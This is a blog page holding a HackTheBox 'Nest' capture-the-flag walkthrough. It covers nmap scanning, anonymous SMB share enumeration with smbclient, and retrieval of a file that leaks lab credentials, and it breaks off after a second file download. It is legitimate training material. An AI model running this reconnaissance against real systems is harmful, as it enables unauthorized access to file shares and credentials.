<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Quick Summary   ‚Üí This machine is really awesome because it has a lot of enumeration especially on SMBClient side. you need a strong knowledge of active directory. Rated as easy machine but other sa">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Nest üïäÔ∏èüê£">
<meta property="og:url" content="https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/index.html">
<meta property="og:site_name" content="$ PŒõYŒõ∆ß0">
<meta property="og:description" content="Quick Summary   ‚Üí This machine is really awesome because it has a lot of enumeration especially on SMBClient side. you need a strong knowledge of active directory. Rated as easy machine but other sa">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ph-payas0.github.io/img/nest/nest-box.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/nest/nest-hash-result.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/nest/CR-Binary.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/nest/admin-decrypted-password.png">
<meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
<meta property="article:published_time" content="2020-06-03T21:46:19.000Z">
<meta property="article:modified_time" content="2020-06-09T21:54:30.986Z">
<meta property="article:author" content="medz">
<meta property="article:tag" content="retired">
<meta property="article:tag" content="windows">
<meta property="article:tag" content="smb">
<meta property="article:tag" content="dotnetfiddle">
<meta property="article:tag" content="smbclient">
<meta property="article:tag" content="vb.net">
<meta property="article:tag" content="decompiler">
<meta property="article:tag" content="assembly">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ph-payas0.github.io/img/nest/nest-box.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon-1.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>HackTheBox - Nest üïäÔ∏èüê£</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="$ PŒõYŒõ∆ß0" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020-06-28/HackTheBox-ServMon/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020-05-29/HackTheBox-Resolute/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&text=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&is_video=false&description=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Nest üïäÔ∏èüê£&body=Check out this article: https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&title=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&name=HackTheBox - Nest üïäÔ∏èüê£&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-06-04/HackTheBox-Nest/&t=HackTheBox - Nest üïäÔ∏èüê£" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-SMB-Shares"><span class="toc-number">4.1.</span> <span class="toc-text">Enumerating SMB Shares</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-TempUser"><span class="toc-number">5.1.</span> <span class="toc-text">Enumerate TempUser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypting-the-Password"><span class="toc-number">5.2.</span> <span class="toc-text">Decrypting the Password</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-C-Smith"><span class="toc-number">6.1.</span> <span class="toc-text">Enumerate C.Smith</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grab-the-user-flag"><span class="toc-number">6.2.</span> <span class="toc-text">Grab the user flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-with-telnet"><span class="toc-number">7.1.</span> <span class="toc-text">Enumeration with telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-the-HqkLdap-exe"><span class="toc-number">7.2.</span> <span class="toc-text">Analyzing the HqkLdap.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debugging-the-HqkLdap-exe"><span class="toc-number">7.3.</span> <span class="toc-text">Debugging the HqkLdap.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Grabbing-the-root-txt"><span class="toc-number">7.4.</span> <span class="toc-text">Grabbing the root.txt</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
        <div class="content index py4">
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Nest üïäÔ∏èüê£
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">$ PŒõYŒõ∆ß0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-06-03T21:46:19.000Z" itemprop="datePublished">04-06-2020</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a> ‚Ä∫ <a class="category-link" href="/categories/HackTheBox/PenTesting/">PenTesting</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/assembly/" rel="tag">assembly</a>, <a class="tag-link" href="/tags/decompiler/" rel="tag">decompiler</a>, <a class="tag-link" href="/tags/dotnetfiddle/" rel="tag">dotnetfiddle</a>, <a class="tag-link" href="/tags/retired/" rel="tag">retired</a>, <a class="tag-link" href="/tags/smb/" rel="tag">smb</a>, <a class="tag-link" href="/tags/smbclient/" rel="tag">smbclient</a>, <a class="tag-link" href="/tags/vb-net/" rel="tag">vb.net</a>, <a class="tag-link" href="/tags/windows/" rel="tag">windows</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/img/nest/nest-box.png" alt="HackTheBox-Nest" title="Nest"></p>
<hr>
<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí This machine is really awesome because it has a lot of enumeration especially on <code>SMBClient</code> side. you need a strong knowledge of active directory. Rated as <code>easy machine</code> but other says it is medium box because there is a debugging mode that beginner players have some trouble with it. But unlike other machine‚Äô this one I don‚Äôt have a proper shell.</p>
<hr>
<h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol>
<li><p><strong>Network Scanning</strong></p>
<p>‚Üí Nmap scan</p>
<p>‚Üí discover open ports and what services are running</p>
</li>
<li><p><strong>Enumeration</strong></p>
<p>‚Üí Service enumeration</p>
<p>‚Üí Enumeration <code>smb</code> shares</p>
<p>‚Üí In this phase there was a lot of <code>SMB</code> Enumeration‚Äô different files has discovered inside</p>
<p>‚Üí Analyzing the retrived content, some interesting at file <code>RU_Config.xml</code> and <code>config.xml</code></p>
</li>
<li><p><strong>Post - Exploitation</strong></p>
<p>‚Üí Analyze how the decrypting of password works `</p>
<p>‚Üí Decrypting the <code>password</code> with `dotnetfiddle</p>
<p>‚Üí running the script will give the password for <code>user</code></p>
</li>
<li><p><strong>Exploitation</strong></p>
<p>‚Üí Enumeration <code>C.Smith</code> user</p>
<p>‚Üí Login as <code>C.Smith</code> with <code>SMB</code></p>
<p>‚Üí finally got the <code>user.txt</code></p>
</li>
<li><p><strong>Privilege Escalation</strong></p>
<p>‚Üí I initially came across the <code>Debug Mode Password.txt</code></p>
<p>‚Üí <strong><code>HQK Reporting Service v1.2</code></strong> service running on port 4386</p>
<p>‚Üí Enumerate <code>HQK Reporting Service v1.2</code> with telnet and this will give a lot of informatio</p>
<p>‚Üí get and execute the <code>.exe</code> file ‚Äì <code>HqkLdap.exe</code> will give the <code>Administrator</code> password</p>
<p>‚Üí Finally get the <code>root.txt</code> flag but with <code>SMB Client</code></p>
</li>
</ol>
<hr>
<h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p>
<hr>
<ul>
<li>-sV      ‚áí Probe open ports to determine service/version info</li>
<li>-sC      ‚áí equivalent to ‚Äîscript=default</li>
<li>-A-      ‚áí Agressive scan</li>
<li>-oN      ‚áí to save our scan results to a text file</li>
</ul>
<hr>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A 10.10.10.178 -oN nmap-Nest</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> ~/htb/Nest </span><br><span class="line">‚ùØ nmap -sV -sC -A <span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span> -oN nmap-Nest</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-22 08:26 PST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span></span><br><span class="line"><span class="function">Host <span class="keyword">is</span> <span class="title">up</span> (<span class="params"><span class="number">0.21</span>s latency</span>).</span></span><br><span class="line"><span class="function">Not shown: 999 filtered ports</span></span><br><span class="line"><span class="function">PORT    STATE SERVICE       VERSION</span></span><br><span class="line"><span class="function">445/tcp open  microsoft-ds?</span></span><br><span class="line"><span class="function">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span><br><span class="line"><span class="function">Device type: general purpose|phone|specialized</span></span><br><span class="line"><span class="function"><span class="title">Running</span> (<span class="params">JUST GUESSING</span>): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (<span class="params"><span class="number">92</span>%</span>)</span></span><br><span class="line"><span class="function">OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista:icrosoft:windows_server_2012:r2</span></span><br><span class="line"><span class="function">Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (<span class="params"><span class="number">92</span>%</span>), Microsoft Windows Phone 7.5 or 8.0 (<span class="params"><span class="number">92</span>%</span>), Microsoft Windows 7 or Windows Server 2008 <span class="title">R2</span> (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows Server 2008 Rndows 8.1 (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows 7 (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows 7 SP1 or Windows Server 2008 <span class="title">R2</span> (<span class="params"><span class="number">91</span>%</span>), Microsoft Windows Vista SP0 o1%), Microsoft Windows Embedded Standard 7 (<span class="params"><span class="number">91</span>%</span>)</span></span><br><span class="line"><span class="function">No exact OS matches <span class="keyword">for</span> <span class="title">host</span> (<span class="params">test conditions non-ideal</span>).</span></span><br><span class="line"><span class="function">Network Distance: 2 hops</span></span><br><span class="line"><span class="function">4386/tcp open  unknown</span></span><br><span class="line"><span class="function">[snip]</span></span><br><span class="line"><span class="function">|   Help: </span></span><br><span class="line"><span class="function">|     Reporting Service V1.2</span></span><br><span class="line"><span class="function">|     This service allows users to run queries against databases <span class="keyword">using</span> the legacy HQK format</span></span><br><span class="line"><span class="function">|     AVAILABLE COMMANDS ---</span></span><br><span class="line"><span class="function">|     LIST</span></span><br><span class="line"><span class="function">|     SETDIR &lt;Directory_Name&gt;</span></span><br><span class="line"><span class="function">|     RUNQUERY &lt;Query_ID&gt;</span></span><br><span class="line"><span class="function">|     DEBUG &lt;Password&gt;</span></span><br><span class="line"><span class="function">|_    HELP &lt;Command&gt;</span></span><br><span class="line"><span class="function">[snip]</span></span><br><span class="line"><span class="function">Host script results:</span></span><br><span class="line"><span class="function">|_clock-skew: 2m26s</span></span><br><span class="line"><span class="function">| smb2-security-mode: </span></span><br><span class="line"><span class="function">|   2.02: </span></span><br><span class="line"><span class="function">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="function">| smb2-time: </span></span><br><span class="line"><span class="function">|   date: 2020-03-22T00:29:42</span></span><br><span class="line"><span class="function">|_  start_date: 2020-03-21T23:00:50</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">TRACEROUTE</span> (<span class="params"><span class="keyword">using</span> port <span class="number">445</span>/tcp</span>)</span></span><br><span class="line"><span class="function">HOP RTT       ADDRESS</span></span><br><span class="line"><span class="function">1   223.12 ms 10.10.14.1</span></span><br><span class="line"><span class="function">2   223.23 ms 10.10.10.178</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">OS and Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span></span><br><span class="line"><span class="function">Nmap done: 1 IP <span class="title">address</span> (<span class="params"><span class="number">1</span> host up</span>) scanned <span class="keyword">in</span> 112.08 seconds</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> ~/htb/Nest took 1m52s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs only 2 port open.</p>
<ul>
<li>445       ‚áí which is <code>SMB Client</code></li>
<li>4386       ‚áí this port is unknow. but in <code>nmap</code> results it has a service of <code>HQK Service</code></li>
</ul>
<hr>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Since TCP/445 is open, we can take a look to see what shares are available:</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest</span><br><span class="line">‚ùØ smbclient -L \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span></span><br><span class="line">Enter WORKGROUP\root<span class="string">'s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        ADMIN$          Disk      Remote Admin</span></span><br><span class="line"><span class="string">        C$              Disk      Default share</span></span><br><span class="line"><span class="string">        Data            Disk      </span></span><br><span class="line"><span class="string">        IPC$            IPC       Remote IPC</span></span><br><span class="line"><span class="string">        Secure$         Disk      </span></span><br><span class="line"><span class="string">        Users           Disk      </span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/Nest</span></span><br><span class="line"><span class="string">‚ùØ</span></span><br></pre></td></tr></table></figure>

<p>The <code>Data</code> share seems to be accessible anonymously. We can recursively list the contents of the share with <code>smbclient</code> so :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\<span class="number">10.10</span><span class="number">.10</span><span class="number">.178</span>\\Data</span><br><span class="line">Enter WORKGROUP\root<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 06:53:46 2019</span></span><br><span class="line"><span class="string">  IT                                  D        0  Thu Aug  8 06:58:07 2019</span></span><br><span class="line"><span class="string">  Production                          D        0  Tue Aug  6 05:53:38 2019</span></span><br><span class="line"><span class="string">  Reports                             D        0  Tue Aug  6 05:53:44 2019</span></span><br><span class="line"><span class="string">  Shared                              D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\IT</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \IT\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Production</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \Production\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Reports</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \Reports\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:51 2019</span></span><br><span class="line"><span class="string">  Maintenance                         D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Templates                           D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Maintenance</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:07:32 2019</span></span><br><span class="line"><span class="string">  Maintenance Alerts.txt              A       48  Tue Aug  6 07:01:44 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:07 2019</span></span><br><span class="line"><span class="string">  HR                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Marketing                           D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\HR</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:01 2019</span></span><br><span class="line"><span class="string">  Welcome Email.txt                   A      425  Thu Aug  8 06:55:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Shared\Templates\Marketing</span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:06 2019</span></span><br><span class="line"><span class="string">smb: \&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">smb: \&gt; cd \Shared\Templates\HR</span></span><br><span class="line"><span class="string">smb: \Shared\Templates\HR\&gt; ls                                                                                                                                                                                                            </span></span><br><span class="line"><span class="string">  .                                   D        0  Thu Aug  8 03:08:01 2019                                                                                                                                                                </span></span><br><span class="line"><span class="string">  ..                                  D        0  Thu Aug  8 03:08:01 2019                                                                                                                                                                </span></span><br><span class="line"><span class="string">  Welcome Email.txt                   A      425  Thu Aug  8 06:55:36 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                10485247 blocks of size 4096. 6543883 blocks available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">smb: \Shared\Templates\HR\&gt;</span></span><br></pre></td></tr></table></figure>

<p>To easily listed all the directory i use the command <code>recurse on</code>, and as you can see‚Äô there was a potential files which is the <code>Maintenance Alerts.txt</code> and <code>Welcome Email.txt</code>. I download it with <code>smbclient</code> :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \Shared\Templates\HR\&gt; mget <span class="string">"Welcome Email.txt"</span></span><br><span class="line">Get file Welcome Email.txt? y</span><br><span class="line">getting file \Shared\Templates\HR\Welcome Email.txt of size <span class="number">425</span> <span class="keyword">as</span> Welcome Email.txt (<span class="number">0.4</span> KiloBytes/sec) (average <span class="number">0.4</span> KiloBytes/sec)</span><br><span class="line">smb: \Shared\Templates\HR\&gt;</span><br></pre></td></tr></table></figure>

<p>Then let‚Äôs read the what‚Äôs the content of <code>.txt</code> file :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cat <span class="string">'Welcome Email.txt'</span> </span><br><span class="line">We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;</span><br><span class="line"></span><br><span class="line">You will find your home folder <span class="keyword">in</span> the following location: </span><br><span class="line">\\HTB-NEST\Users\&lt;USERNAME&gt;</span><br><span class="line"></span><br><span class="line">If you have any issues accessing specific services or workstations, please inform the </span><br><span class="line">IT department and use the credentials below until all systems have been <span class="built_in">set</span> up <span class="keyword">for</span> you.</span><br><span class="line"></span><br><span class="line">Username: TempUser</span><br><span class="line">Password: welcome2019</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thank you</span><br><span class="line">HR</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>Next is the <code>Maintenance Alerts.txt</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">Current directory <span class="keyword">is</span> \Shared\Templates\HR\</span><br><span class="line">smb: \Shared\Templates\HR\&gt; cd /</span><br><span class="line">smb: \&gt; cd \Shared\Maintenance</span><br><span class="line">smb: \Shared\Maintenance\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">03</span>:<span class="number">07</span>:<span class="number">32</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">03</span>:<span class="number">07</span>:<span class="number">32</span> <span class="number">2019</span></span><br><span class="line">  Maintenance Alerts.txt              A       <span class="number">48</span>  Tue Aug  <span class="number">6</span> <span class="number">07</span>:<span class="number">01</span>:<span class="number">44</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">                <span class="number">10485247</span> blocks of size <span class="number">4096.</span> <span class="number">6543883</span> blocks available</span><br><span class="line">smb: \Shared\Maintenance\&gt; mget <span class="string">"Maintenance Alerts.txt"</span></span><br><span class="line">Get file Maintenance Alerts.txt? y</span><br><span class="line">getting file \Shared\Maintenance\Maintenance Alerts.txt of size <span class="number">48</span> <span class="keyword">as</span> Maintenance Alerts.txt (<span class="number">0.0</span> KiloBytes/sec) (average <span class="number">0.1</span> KiloBytes/sec)</span><br><span class="line">smb: \Shared\Maintenance\&gt;</span><br></pre></td></tr></table></figure>

<p>Then read the content :</p>
